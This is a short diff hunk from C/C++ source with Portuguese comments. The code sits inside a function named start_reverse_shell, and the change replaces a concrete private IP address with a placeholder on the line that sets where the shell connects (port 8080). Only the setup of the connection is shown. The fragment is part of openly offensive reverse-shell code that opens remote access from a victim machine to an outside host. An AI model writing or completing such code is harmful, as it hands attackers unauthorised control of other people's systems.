@@ -51,7 +51,7 @@ void start_reverse_shell() {
 
     sockaddr_in server_address; // Estrutura para armazenar informações do servidor
     server_address.sin_family = AF_INET; // Define a família de endereços como IPv4
-    server_address.sin_addr.s_addr = inet_addr("192.168.0.26"); // Endereço IP do servidor
+    server_address.sin_addr.s_addr = inet_addr("192.168.0.X"); // Endereço IP do servidor
     server_address.sin_port = htons(8080); // Porta do servidor
 
     // Tenta conectar ao servidor
